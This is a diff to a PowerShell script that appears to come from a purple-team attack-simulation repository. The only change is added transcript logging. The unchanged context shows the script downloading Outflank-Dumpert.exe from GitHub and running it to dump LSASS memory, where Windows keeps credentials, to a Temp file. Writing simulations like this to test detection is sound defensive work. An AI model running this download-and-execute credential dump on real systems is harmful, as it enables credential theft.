@@ -6,6 +6,8 @@
     Download dumpert.exe from forked project https://github.com/mthcht/Dumpert/raw/exe/EXE/Outflank-Dumpert.exe and execute it 
 #>
 
+Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append
+
 # Download and execute Outflank-Dumpert.exe
 $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/Outflank-Dumpert.exe"
 $dumpfile = "$env:windir\Temp\dumpert.dmp"
@@ -29,3 +31,5 @@ try {
 catch {
     Write-Error $_
 }
+
+Stop-Transcript
